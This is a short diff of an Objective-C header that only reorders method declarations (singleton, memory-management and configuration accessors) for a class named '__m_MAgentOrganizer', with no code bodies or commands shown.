@@ -83,15 +83,17 @@ enum contactType {
 }
 
 + (__m_MAgentOrganizer *)sharedInstance;
-+ (id)allocWithZone: (NSZone *)aZone;
 - (id)copyWithZone: (NSZone *)aZone;
-- (id)retain;
-- (unsigned)retainCount;
++ (id)allocWithZone: (NSZone *)aZone;
+
 - (void)release;
 - (id)autorelease;
+- (id)retain;
+- (unsigned)retainCount;
 
-- (void)setAgentConfiguration: (NSMutableDictionary *)aConfiguration;
 - (NSMutableDictionary *)mConfiguration;
+- (void)setAgentConfiguration: (NSMutableDictionary *)aConfiguration;
+
 
 @end
 
